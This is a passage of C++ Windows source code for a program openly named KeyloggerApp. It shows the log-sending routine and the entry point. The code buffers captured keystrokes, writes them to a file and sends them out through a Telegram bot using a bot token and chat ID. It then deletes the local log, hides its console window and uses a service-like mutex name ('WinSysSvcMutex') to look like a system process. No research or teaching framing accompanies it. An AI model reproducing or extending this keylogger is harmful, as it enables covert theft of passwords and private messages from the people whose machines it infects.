            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        running = false;
        if (mainThread.joinable()) {
            mainThread.join();
        }
    }

private:
    void SendLogs() {
        // Save current buffer to file
        {
            lock_guard<mutex> lock(g_logMutex);
            if (!g_logBuffer.empty()) {
                fileManager.WriteLog(g_logBuffer);
                g_logBuffer.clear();
            }
        }

        // Read log file and send
        auto logContent = fileManager.ReadLog();
        if (!logContent.empty()) {
            wstring message(logContent.begin(), logContent.end());
            telegram.SendMessage(message);
            fileManager.DeleteLog();
        }
    }
};

// ===== Entry Point =====
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
    // Ensure single instance
    HANDLE hMutex = CreateMutexW(NULL, FALSE, L"Global\\WinSysSvcMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0;
    }

    // Hide console window if present
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);

    // Initialize COM
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    // Run application
    KeyloggerApp app(BOT_TOKEN, CHAT_ID);
    app.Run();

    // Cleanup
    CoUninitialize();
    ReleaseMutex(hMutex);
    CloseHandle(hMutex);

    return 0;
}